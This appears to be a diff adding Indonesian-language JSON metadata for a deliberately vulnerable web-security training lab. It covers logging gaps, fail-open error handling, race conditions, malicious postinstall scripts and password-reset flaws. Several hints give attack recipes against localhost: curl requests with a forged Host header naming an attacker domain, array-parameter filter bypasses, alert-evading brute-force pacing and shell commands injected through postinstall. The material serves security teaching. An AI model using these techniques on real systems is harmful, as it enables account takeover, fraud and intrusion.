+      "source_fields": [
+        "view",
+        "q"
+      ]
+    },
+    {
+      "title": "Tidak ada log/alert untuk brute force",
+      "paragraphs": [
+        "Hanya login sukses yang dicatat - percobaan gagal (sekalipun ratusan dalam hitungan detik) tidak pernah muncul di log manapun, menunjukkan celah deteksi yang nyata."
+      ],
+      "id": "a09-logging-alerting-failures--logging--no-alerting-bruteforce",
+      "category": "a09-logging-alerting-failures",
+      "topic": "logging",
+      "source_lab_status": 200,
+      "source_order": 130,
+      "source_hints": [
+        "Lihat Hint Goal: PIN admin adalah 3 digit ( 000 – 999 ), tidak ada\nrate limiting/lockout/CAPTCHA sama sekali. Yang jadi fokus lab ini bukan sekadar \"brute force\nberhasil\" (itu topik kategori Brute Force Protection) — tapi fakta bahwa tidak ada\nsatu pun jejak dari ratusan percobaan gagal yang tersimpan di sistem, sehingga tim\nkeamanan tidak akan pernah tahu serangan ini terjadi. Pakai kotak \"Coba banyak PIN sekaligus\" di bawah, tempel daftar PIN (satu per\nbaris) untuk mencoba banyak kombinasi dalam satu request. Contoh cepat: generate 000 s.d. 999 lalu tempel semuanya."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "pin_single",
+        "pin_bulk"
+      ]
+    },
+    {
+      "title": "Data sensitif tercatat mentah di log",
+      "paragraphs": [
+        "Log \"untuk debugging\" mencatat seluruh data form apa adanya, termasuk field sensitif - begitu log ini bocor/diakses, data pengguna lain ikut terekspos."
+      ],
+      "id": "a09-logging-alerting-failures--logging--sensitive-data-in-logs",
+      "category": "a09-logging-alerting-failures",
+      "topic": "logging",
+      "source_lab_status": 200,
+      "source_order": 131,
+      "source_hints": [
+        "Lihat Hint Goal: form \"Update Kartu Kredit\" di bawah menulis SELURUH data form —\ntermasuk nomor kartu penuh dan CVV — ke data/debug_requests.log dalam bentuk\nplaintext, \"supaya gampang di-debug kalau ada error\". Log ini juga sudah berisi beberapa entri\ndari user lain yang sudah pernah submit form sebelum kamu. Submit form dengan data kartu (bebas, cuma demo) lalu buka ?view=raw_log — endpoint debug internal yang \"lupa\" dilepas dari\nproduksi — untuk melihat log mentahnya, termasuk kartu milikmu dan milik semua\nuser lain."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "name",
+        "card_number",
+        "cvv"
+      ]
+    },
+    {
+      "title": "Alert threshold bisa dievasi lewat pacing",
+      "paragraphs": [
+        "Mengirim percobaan gagal dalam batch yang selalu di bawah ambang batas per window membuat total ratusan percobaan tidak pernah memicu satu alert pun, walau alert-nya sendiri secara teknis berfungsi."
+      ],
+      "id": "a09-logging-alerting-failures--alerting-log-integrity-gaps--threshold-evasion",
+      "category": "a09-logging-alerting-failures",
+      "topic": "alerting-log-integrity-gaps",
+      "source_lab_status": 200,
+      "source_order": 132,
+      "source_hints": [
+        "Lihat Hint Goal: berbeda dari Lab 3 (yang sama sekali tidak ada alerting),\nlab ini punya mekanisme alert sungguhan: server menghitung berapa banyak percobaan login gagal\nyang masuk dalam 60 detik terakhir (sliding window), dan memicu\n\" ALERT: possible brute force! \" kalau jumlahnya lebih dari 20 dalam\nwindow itu. PIN admin 3 digit: 705 . Pakai kotak \"Coba banyak PIN sekaligus\" untuk\nmengirim satu batch tebakan PIN salah (misalnya 15 baris, sengaja di bawah 20 supaya tidak pernah\nmemicu alert dalam satu request). Tunggu lebih dari 60 detik , lalu kirim batch\n15 PIN salah lagi. Ulangi beberapa kali (reload halaman untuk menunggu, lalu submit lagi). Perhatikan dashboard di bawah: \"Jumlah alert yang pernah terpicu sejauh ini\" akan\ntetap 0 walaupun \"Total percobaan gagal sepanjang waktu\" terus naik ke puluhan\nbahkan ratusan — karena setiap batch, dilihat sendiri-sendiri, tidak pernah melewati 20\npercobaan dalam 60 detik. Threshold yang naif seperti ini bisa \"dikelabui\" hanya dengan mengatur\nkecepatan (pacing) serangan."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "pin_single",
+        "pin_bulk"
+      ]
+    },
+    {
+      "title": "Audit log bisa dihapus lewat fitur \"hapus riwayat\"",
+      "paragraphs": [
+        "\"Hapus Riwayat Aktivitas Saya\" yang terlihat seperti fitur privasi biasa ternyata menghapus data audit log yang sama yang dipakai tim SOC untuk investigasi keamanan."
+      ],
+      "id": "a09-logging-alerting-failures--alerting-log-integrity-gaps--log-tampering",
+      "category": "a09-logging-alerting-failures",
+      "topic": "alerting-log-integrity-gaps",
+      "source_lab_status": 200,
+      "source_order": 133,
+      "source_hints": [
+        "Lihat Hint Goal: halaman \"Riwayat Aktivitas Saya\" di bawah menampilkan riwayat aktivitas akun\ndemo budi , lengkap dengan tombol \"Hapus Semua Riwayat\" — terlihat seperti fitur\nprivasi/kerapihan yang wajar (\"bersihkan histori saya\"). Bandingkan dengan tab\n\"Admin: Log Investigasi (SOC)\" — keduanya membaca sumber data yang persis sama . Klik \"Hapus Semua Riwayat\" di tab user, lalu buka tab SOC — log investigasi\nkeamanan yang seharusnya jadi bukti forensik ikut lenyap, dihapus oleh pengguna biasa (atau\npenyerang yang sudah mengambil alih akun user tersebut) tanpa hak akses admin sama sekali."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "Kebocoran lewat console.log() di browser",
+      "paragraphs": [
+        "Data sensitif bocor lewat kanal yang sama sekali berbeda dari log server - console browser tiap pengunjung, terlihat siapa pun yang membuka DevTools atau lewat ekstensi browser yang jahat."
+      ],
+      "id": "a09-logging-alerting-failures--alerting-log-integrity-gaps--client-side-console-logging",
+      "category": "a09-logging-alerting-failures",
+      "topic": "alerting-log-integrity-gaps",
+      "source_lab_status": 200,
+      "source_order": 134,
+      "source_hints": [
+        "Lihat Hint Goal: halaman \"checkout\" di bawah ini terlihat normal — tidak ada apa pun\nyang sensitif muncul di teks halaman atau di response HTML/network. Kebocorannya murni terjadi di console browser , lewat baris console.log(...) yang lupa dihapus\ndeveloper sebelum rilis ke produksi. Buka DevTools browser kamu sendiri sekarang (klik kanan → Inspect, atau\nF12/Cmd+Opt+I), pindah ke tab Console , lalu klik tombol\n\"Lanjutkan ke Pembayaran\" di bawah. Kamu akan melihat baris DEBUG session: muncul di\nconsole berisi session_token dan internal_api_key sungguhan —\npersis seperti yang direproduksi di kotak abu-abu di bawah halaman ini (supaya lab tetap bisa\ndibuktikan tanpa harus membuka browser)."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "Log ada tapi kurang konteks untuk investigasi",
+      "paragraphs": [
+        "Log secara teknis \"ada\", tapi tidak mencatat identitas yang mengaitkan (user, IP, session, request ID) - investigasi insiden jadi praktis mustahil walau log-nya sendiri tidak kosong."
+      ],
+      "id": "a09-logging-alerting-failures--alerting-log-integrity-gaps--insufficient-log-context",
+      "category": "a09-logging-alerting-failures",
+      "topic": "alerting-log-integrity-gaps",
+      "source_lab_status": 200,
+      "source_order": 135,
+      "source_hints": [
+        "Lihat Hint Goal: tim finance melaporkan ada transaksi mencurigakan senilai Rp 50.000.000 dan minta bantuan mencari tahu siapa pelakunya dari\nlog pembayaran. Cari baris log yang jumlahnya cocok di bawah — lalu coba jawab: siapa\nuser-nya? dari IP mana? request/session mana? Kamu akan sadar log lama (v1) memang \"ada\", tapi\nsama sekali tidak menjawab pertanyaan itu. Klik tombol \"Proses Pembayaran Baru\" untuk melihat perbandingan: bagaimana\nseharusnya satu baris log pembayaran ditulis supaya benar-benar bisa diinvestigasi."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "Fail-open saat payment gateway timeout",
+      "paragraphs": [
+        "Saat pemanggilan layanan verifikasi pembayaran melempar exception (timeout/gagal), blok catch-nya malah mengasumsikan pembayaran berhasil alih-alih menolak transaksi."
+      ],
+      "id": "a10-mishandling-exceptional-conditions--exceptions--fail-open-payment-timeout",
+      "category": "a10-mishandling-exceptional-conditions",
+      "topic": "exceptions",
+      "source_lab_status": 200,
+      "source_order": 136,
+      "source_hints": [
+        "Lihat Hint Centang checkbox \"simulasikan gateway down\" lalu klik Checkout. Perhatikan status\norder yang muncul di tabel riwayat di bawah - apakah order tetap jadi PAID walaupun\nkamu SENGAJA membuat verifikasi pembayaran gagal, dan kamu tidak pernah memberikan konfirmasi\npembayaran nyata apa pun?"
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "simulate_gateway_down"
+      ]
+    },
+    {
+      "title": "Error message bocor dari input tak terduga",
+      "paragraphs": [
+        "Tidak ada validasi untuk kasus tepi (nol, negatif, tipe salah) - PHP menampilkan error bawaan lengkap dengan path file & baris kode saat kasus-kasus ini terjadi."
+      ],
+      "id": "a10-mishandling-exceptional-conditions--exceptions--error-message-info-leak",
+      "category": "a10-mishandling-exceptional-conditions",
+      "topic": "exceptions",
+      "source_lab_status": 200,
+      "source_order": 137,
+      "source_hints": [
+        "Lihat Hint Form \"Cek Diskon\" di bawah TIDAK punya penanganan error/validasi input sama\nsekali - kode-nya menganggap input selalu berupa angka wajar. Coba: (1) jumlah_item =\n0 untuk memicu division by zero , (2) jumlah_item = 999 atau angka\nnegatif untuk memicu undefined array key (tabel diskon cuma didefinisikan untuk 1-5),\n(3) harga = abc (bukan angka) untuk memicu TypeError . Semua pesan error\nbawaan PHP ini tampil apa adanya di halaman - lihat baik-baik, apakah ada informasi yang\nseharusnya tidak pernah dilihat pengguna biasa (path folder di server, nama file, nomor baris\nkode)?"
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "harga",
+        "jumlah_item",
+        "harga_strict"
+      ]
+    },
+    {
+      "title": "Race condition di pengecekan \"sudah dipakai\"",
+      "paragraphs": [
+        "Cek \"sudah dipakai\" dan penandaan \"sudah dipakai\" terjadi di dua langkah terpisah dengan jeda di antaranya - request yang dikirim nyaris bersamaan bisa sama-sama lolos pengecekan sebelum salah satunya sempat menandai kartu sebagai terpakai."
+      ],
+      "id": "a10-mishandling-exceptional-conditions--exceptions--race-condition-giftcard",
+      "category": "a10-mishandling-exceptional-conditions",
+      "topic": "exceptions",
+      "source_lab_status": 200,
+      "source_order": 138,
+      "source_hints": [
+        "Lihat Hint Tombol \"Redeem\" di bawah sengaja punya jeda 300ms antara pengecekan\n\"sudah dipakai belum\" dan penulisan status \"sudah dipakai\". Coba: (1) buka halaman ini di dua tab browser lalu klik tombol Redeem di kedua tab secepat mungkin (nyaris\nbersamaan), atau (2) pakai dua request curl paralel dari terminal: curl -s -X POST http://localhost:8079/exceptcond/lab3_race_condition_giftcard.php -d \"action=redeem\" & \\\ncurl -s -X POST http://localhost:8079/exceptcond/lab3_race_condition_giftcard.php -d \"action=redeem\" & \\\nwait Lihat tabel \"Log Redemption\" di bawah - apakah gift card yang sama berhasil\ndi-redeem lebih dari sekali, dan saldo wallet bertambah lebih dari satu kali lipat nilai gift\ncard? Kalau race belum berhasil di percobaan pertama, klik \"Reset State Lab\" lalu ulangi (jaringan\nlokal kadang membuat dua request tidak benar-benar bersamaan)."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "action"
+      ]
+    },
+    {
+      "title": "Fail-open di dalam blok catch keamanan",
+      "paragraphs": [
+        "Pengecekan kepemilikan dibungkus try/catch - input yang tidak terduga (mis. tipe data salah) membuat pengecekan itu sendiri melempar exception, dan blok catch-nya meloloskan akses alih-alih menolak."
+      ],
+      "id": "a10-mishandling-exceptional-conditions--exceptions--failopen-catch-block",
+      "category": "a10-mishandling-exceptional-conditions",
+      "topic": "exceptions",
+      "source_lab_status": 200,
+      "source_order": 139,
+      "source_hints": [
+        "Lihat Hint Kamu login sebagai alice .\nCoba: (1) ?report_id=1 (laporan milik kamu sendiri, alice - harus berhasil), (2) ?report_id=2 (laporan milik admin - harus DITOLAK, membuktikan pengecekan normal\nmemang bekerja), lalu (3) ?report_id=abc atau (4) ?report_id[]=1 (bikin report_id jadi array) - dua yang terakhir ini bikin fungsi pengecekan\nmelempar error di tengah jalan. Lihat apa yang terjadi ke keputusan akses saat itu."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "Retry setelah timeout menyebabkan double charge",
+      "paragraphs": [
+        "Saat response pembayaran \"timeout\" (padahal charge-nya sudah benar-benar diproses di backend), klik \"Coba Lagi\" mengirim ulang charge yang sama tanpa idempotency key - order yang sama ter-charge dua kali."
+      ],
+      "id": "a10-mishandling-exceptional-conditions--non-atomic-type-unsafe-handling--duplicate-charge-retry",
+      "category": "a10-mishandling-exceptional-conditions",
+      "topic": "non-atomic-type-unsafe-handling",
+      "source_lab_status": 200,
+      "source_order": 140,
+      "source_hints": [
+        "Lihat Hint Klik \"Bayar (jalur normal)\" sekali dulu - satu baris charge muncul di tabel\nbawah, wajar. Sekarang reset state lab, lalu klik \"Bayar (simulasikan response timeout)\" - pesan\nerror muncul seolah pembayaran gagal/tidak jelas hasilnya. Klik tombol \"Coba Lagi\" yang muncul\n(mengirim ulang order & jumlah yang PERSIS SAMA). Lihat tabel \"Charge Tercatat untuk Order\nIni\" - berapa baris charge yang tercatat untuk order yang sama setelah kamu retry beberapa kali?\nApakah backend benar-benar tahu pembayaran \"timeout\" itu sudah sukses diproses sebelumnya?"
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "action",
+        "simulate_timeout"
+      ]
+    },
+    {
+      "title": "Transaksi multi-step tanpa rollback",
+      "paragraphs": [
+        "Transfer dana dilakukan lewat dua step terpisah tanpa transaction/rollback yang membungkus keduanya - kalau step kedua gagal karena input tak terduga, saldo yang sudah dikurangi di step pertama tetap hilang begitu saja."
+      ],
+      "id": "a10-mishandling-exceptional-conditions--non-atomic-type-unsafe-handling--no-rollback-partial-failure",
+      "category": "a10-mishandling-exceptional-conditions",
+      "topic": "non-atomic-type-unsafe-handling",
+      "source_lab_status": 200,
+      "source_order": 141,
+      "source_hints": [
+        "Lihat Hint Akun tujuan yang VALID adalah ID 1002 (Akun\nB). Coba transfer normal dulu (jumlah bebas, akun tujuan 1002 )\n- perhatikan saldo A turun DAN saldo B naik, wajar. Sekarang reset state lab, lalu coba transfer\nlagi tapi isi field \"Akun Tujuan\" dengan sesuatu yang tidak valid, misalnya kosongkan saja atau isi abc atau ID akun yang tidak ada seperti 9999 . Perhatikan saldo akun A -\napakah tetap berkurang walaupun step kedua (kredit ke akun tujuan) gagal dengan error?"
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "action",
+        "amount",
+        "dest_account"
+      ]
+    },
+    {
+      "title": "Filter in_array() dilewati lewat tipe data tak terduga",
+      "paragraphs": [
+        "Filter blocklist mengasumsikan input selalu string - mengirim field yang sama sebagai array (field[]=admin) membuat in_array() tidak pernah menemukan kecocokan, melewati filter dengan nilai yang identik."
+      ],
+      "id": "a10-mishandling-exceptional-conditions--non-atomic-type-unsafe-handling--type-confusion-filter-bypass",
+      "category": "a10-mishandling-exceptional-conditions",
+      "topic": "non-atomic-type-unsafe-handling",
+      "source_lab_status": 200,
+      "source_order": 142,
+      "source_hints": [
+        "Lihat Hint Coba dulu Form A: isi admin lalu submit - filter menolaknya dengan\nbenar (bukti filter normal memang bekerja untuk input string biasa). Sekarang coba Form B: form\nini mengirim field yang SAMA ( display_name ) tapi dengan nama display_name[] berisi nilai admin yang PERSIS SAMA - jadi PHP\nmenerimanya sebagai array ['admin'] , bukan string 'admin' . Perhatikan\napakah filter in_array() tetap menolaknya, atau malah meloloskannya begitu saja.\nKamu juga bisa coba manual lewat curl: curl -s -X POST http://localhost:8079/exceptcond/lab7_type_confusion_filter_bypass.php --data-urlencode \"display_name[]=admin\""
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "display_name",
+        "display_name[]",
+        "action"
+      ]
+    },
+    {
+      "title": "Fail-open dari response API yang gagal di-parse",
+      "paragraphs": [
+        "Default value dari operator ?? dipakai untuk field keamanan - saat response API berbentuk tak terduga (bukan timeout, tapi shape yang salah), field yang hilang diam-diam dianggap \"tidak flagged\" alih-alih \"belum pernah benar-benar dicek\"."
+      ],
+      "id": "a10-mishandling-exceptional-conditions--non-atomic-type-unsafe-handling--malformed-response-fail-open",
+      "category": "a10-mishandling-exceptional-conditions",
+      "topic": "non-atomic-type-unsafe-handling",
+      "source_lab_status": 200,
+      "source_order": 143,
+      "source_hints": [
+        "Lihat Hint Detail order di bawah SENGAJA dibuat terlihat mencurigakan (nominal besar, akun\nbaru berumur 0 hari) - kalau fraud-check API berfungsi normal, order ini SEHARUSNYA diblokir. Coba\nklik \"Checkout (fraud-check normal)\" dulu - lihat hasilnya (harus DIBLOKIR). Sekarang klik\n\"Checkout (simulasikan response API rusak/tidak terduga)\" - fraud-check API-nya TIDAK timeout,\nTETAP menjawab dengan JSON valid, cuma bentuknya beda dari yang diharapkan kode ini. Perhatikan:\napakah order yang SAMA-SAMA mencurigakan ini tetap diblokir, atau malah lolos begitu saja?"
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "action",
+        "simulate_malformed_response"
+      ]
+    },
+    {
+      "title": "Postinstall script berbahaya",
+      "paragraphs": [
+        "Package manager modern menjalankan script postinstall milik dependency secara otomatis dengan privilese penuh - dependency yang tidak direview bisa menyelundupkan perintah shell apa pun lewat script ini."
+      ],
+      "id": "a03-software-supply-chain-failures--supply-chain--malicious-postinstall",
+      "category": "a03-software-supply-chain-failures",
+      "topic": "supply-chain",
+      "source_lab_status": 200,
+      "source_order": 32,
+      "source_hints": [
+        "Lihat Hint Goal: paket manager sungguhan (npm, composer, pip, dst.) mengizinkan dependency\nmendefinisikan skrip lifecycle (mis. postinstall ) yang otomatis dijalankan\nbegitu paket ter-install/ter-build — dengan privilege penuh milik siapa pun yang menjalankan\ninstall/build tersebut. Kalau sebuah project menarik dependency pihak ketiga tanpa mereview isi\nskrip lifecycle-nya, penulis dependency itu efektif mendapat eksekusi kode di setiap mesin yang\nmembangun project tersebut. Submit paket baru dengan field postinstall diisi perintah shell,\nmisalnya id atau whoami , lalu klik \"Jalankan Build (Admin)\" untuk\nmelihat perintah itu benar-benar dieksekusi di server."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "action",
+        "pkg_name",
+        "pkg_desc",
+        "pkg_postinstall"
+      ]
+    },
+    {
+      "title": "Password reset token bisa diprediksi",
+      "paragraphs": [
+        "Waktu server bocor lewat header Date, dan username sering publik - keduanya cukup untuk menghitung ulang token."
+      ],
+      "id": "a04-cryptographic-failures--insecure-randomness--predictable-reset-token",
+      "category": "a04-cryptographic-failures",
+      "topic": "insecure-randomness",
+      "source_lab_status": 200,
+      "source_order": 41,
+      "source_hints": [
+        "Lihat Hint Goal: token reset dibuat dari substr(md5($username . time()), 0, 16) .\nServer tidak pernah menampilkan token ke UI (disimulasikan seperti \"dikirim lewat email\"), tapi\ndi dunia nyata attacker tetap tahu waktu server saat request dikirim lewat\nheader respons HTTP standar Date (selalu ada di setiap response, presisi 1 detik) —\nlalu tinggal mencoba beberapa kandidat timestamp di sekitar waktu itu (untuk mengompensasi\nlatency jaringan/pemrosesan). Untuk lab ini, timestamp persis yang dipakai server ditampilkan\nlangsung di bawah supaya kamu bisa fokus ke perhitungan algoritmanya."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "username",
+        "c_username",
+        "c_token"
+      ]
+    },
+    {
+      "title": "Token tetap valid setelah logout",
+      "paragraphs": [
+        "Token lama yang berhasil dicuri sebelum logout tetap memberi akses penuh."
+      ],
+      "id": "a07-authentication-failures--session-management--token-survives-logout",
+      "category": "a07-authentication-failures",
+      "topic": "session-management",
+      "source_lab_status": 200,
+      "source_order": 110,
+      "source_hints": [
+        "Lihat Hint Goal: login, catat nilai token yang muncul di bawah (mensimulasikan token yang\nberhasil dicuri attacker, mis. lewat XSS atau sniffing jaringan tanpa TLS), lalu klik Logout.\nTempelkan token yang kamu catat tadi ke form \"Cek akses dengan token\" di bawah — token itu\nakan tetap diterima meski kamu sudah logout."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "check_token"
+      ]
+    },
+    {
+      "title": "Token bocor lewat tracking pixel email",
+      "paragraphs": [
+        "Gambar 1x1 dari domain analytics pihak ketiga di email transaksional bisa membawa token rahasia yang sama dengan link reset."
+      ],
+      "id": "a07-authentication-failures--password-reset--token-leak-email",
+      "category": "a07-authentication-failures",
+      "topic": "password-reset",
+      "source_lab_status": 200,
+      "source_order": 114,
+      "source_hints": [
+        "Lihat Hint Goal: request reset untuk admin , lalu lihat \"Simulasi Inbox\" di\nbawah — email tersebut merender sebuah gambar 1x1 dari domain analytics email pihak\nketiga (disimulasikan lewat mail_tracker_beacon.php ), dan URL gambar itu membawa\ntoken reset yang sama persis dengan yang ada di link reset resminya. Begitu email dibuka\n(gambar dirender otomatis oleh klien email/webmail preview), token bocor ke pihak ketiga itu\ntanpa korban maupun aplikasi sadar. Scroll ke bawah untuk lihat \"Log Tracker Pihak Ketiga\",\nsalin token dari sana, lalu pakai di form \"Confirm Reset\" untuk mengganti password admin."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "username",
+        "token",
+        "new_password"
+      ]
+    },
+    {
+      "title": "Token bisa dipakai berulang kali",
+      "paragraphs": [
+        "Token yang seharusnya sekali pakai tetap berfungsi selamanya karena tidak ada mekanisme invalidasi."
+      ],
+      "id": "a07-authentication-failures--password-reset--token-reuse",
+      "category": "a07-authentication-failures",
+      "topic": "password-reset",
+      "source_lab_status": 200,
+      "source_order": 115,
+      "source_hints": [
+        "Lihat Hint Goal: request reset untuk admin , catat tokennya, lalu gunakan token\nyang sama itu berkali-kali di form \"Confirm Reset\" di bawah — setiap kali akan tetap\nberhasil \"mereset\" password (ke nilai apa pun yang kamu masukkan), karena token tidak pernah\nditandai sudah dipakai. Dampak nyata: kalau token ini pernah bocor sekali saja (mis. lewat log, riwayat\nbrowser, atau kelalaian lain), attacker bisa mereset password akun itu kapan pun mereka mau,\ntanpa batas waktu maupun jumlah pemakaian."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "username",
+        "token",
+        "new_password"
+      ]
+    },
+    {
+      "title": "Kode reset pendek tanpa rate limiting",
+      "paragraphs": [
+        "Ruang kemungkinan yang kecil (10.000) dikombinasikan dengan tidak adanya rate limiting membuat brute force jadi praktis."
+      ],
+      "id": "a07-authentication-failures--password-reset--brute-forceable-code",
+      "category": "a07-authentication-failures",
+      "topic": "password-reset",
+      "source_lab_status": 200,
+      "source_order": 116,
+      "source_hints": [
+        "Lihat Hint Goal: kode verifikasi cuma 4 digit (10.000 kemungkinan) dan form \"Confirm\nReset\" tidak membatasi jumlah percobaan sama sekali. Tool \"Brute Force\" di bawah mensimulasikan\nserangan otomatis yang mencoba SEMUA 10.000 kombinasi secara berurutan — perhatikan betapa\ncepatnya kode ditemukan. Di dunia nyata: Burp Intruder dengan payload \"Numbers\" dari 0000-9999 (perlu\npadding 4 digit) bisa menyelesaikan ini dalam hitungan detik-menit tergantung kecepatan\njaringan, karena tidak ada rate limiting yang memperlambatnya."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "username",
+        "b_username",
+        "c_username",
+        "code"
+      ]
+    },
+    {
+      "title": "Password reset poisoning lewat Host header",
+      "paragraphs": [
+        "Header Host bisa diisi bebas oleh pengirim request - server keliru mempercayainya sebagai domain aplikasi saat membangun link reset."
+      ],
+      "id": "a07-authentication-failures--password-reset--host-header-poisoning",
+      "category": "a07-authentication-failures",
+      "topic": "password-reset",
+      "source_lab_status": 200,
+      "source_order": 117,
+      "source_hints": [
+        "Lihat Hint Goal: minta reset untuk admin lewat request yang header Host -nya sudah kamu ubah jadi domain milik attacker. Server memakai header itu\napa adanya untuk membangun link reset yang \"dikirim lewat email\" — kalau link itu nanti\ndiklik korban (atau di- preview otomatis oleh pemindai link/antivirus email, hal yang\nsangat umum), token akan terkirim ke server attacker, bukan server aplikasi yang sah: curl -X POST -H \"Host: attacker-evil.test\" -d \"username=admin\" \\\n  http://localhost:8079/password-reset/lab4_host_header_poisoning.php --data-urlencode \"request_reset=1\" Lihat \"Simulasi Inbox\" di bawah setelah request — perhatikan domain pada\nlink reset yang dihasilkan."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "username",
+        "token",
+        "new_password"
+      ]
+    }
+  ]
+}
